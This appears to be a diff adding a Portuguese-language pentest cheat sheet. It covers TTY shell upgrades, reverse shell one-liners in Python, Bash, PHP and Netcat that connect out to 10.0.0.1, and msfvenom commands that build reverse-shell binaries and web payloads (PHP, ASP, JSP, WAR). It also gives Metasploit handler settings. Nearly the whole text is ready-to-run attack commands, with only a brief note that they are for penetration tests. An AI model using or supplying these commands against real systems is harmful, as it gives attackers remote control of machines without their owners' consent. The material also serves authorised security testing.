@@ -1,0 +1,102 @@
+Spawning a TTY Shell
+
+Freqüentemente, durante os pen tests, você pode obter um shell sem ter tty, mas deseja interagir mais com o sistema. Aqui estão alguns comandos que permitirão que você crie um shell tty. Obviamente, parte disso dependerá do ambiente do sistema e dos pacotes instalados.
+
+            python -c 'import pty; pty.spawn("/bin/sh")'
+            export TERM=linux
+            echo os.system('/bin/bash')
+            /bin/sh -i
+            perl —e 'exec "/bin/sh";'
+            perl: exec "/bin/sh";
+            ruby: exec "/bin/sh"
+            lua: os.execute('/bin/sh')
+            (From within IRB) exec "/bin/sh"
+            (From within vi)  :!bash
+            (From within vi) :set shell=/bin/bash:shell
+            (From within nmap) : !sh
+        
+
+Reverse Shell Cheat Sheet
+
+Python
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Bash
+
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+PHP
+
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+Netcat
+
+nc -e /bin/sh 10.0.0.1 1234
+Servidor Web Simples com Python
+
+            
+                
+
+
+                    $ cd meu_diretorio
+                    $ python -m SimpleHTTPServer
+                    $ python -m SimpleHTTPServer 8080
+                
+
+            
+        
+
+PAYLOADS BINARIOS
+Linux
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf
+Windows
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe
+Mac
+
+msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho
+Web Payloads
+PHP
+
+msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.php cat shell.php | pbcopy && echo ' shell.php && pbpaste >> shell.php
+ASP
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp
+JSP
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp
+WAR
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
+Scripting Payloads
+Python
+
+msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py
+Bash
+
+msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh
+Perl
+
+msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
+Shellcode
+Linux Based Shellcode
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f
+Windows Based Shellcode
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f
+Mac Based Shellcode
+
+msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f
+Handlers
+
+use exploit/multi/handler
+set PAYLOAD 
+set LHOST 
+set LPORT 
+set ExitOnSession false
+exploit -j -z
+        
+
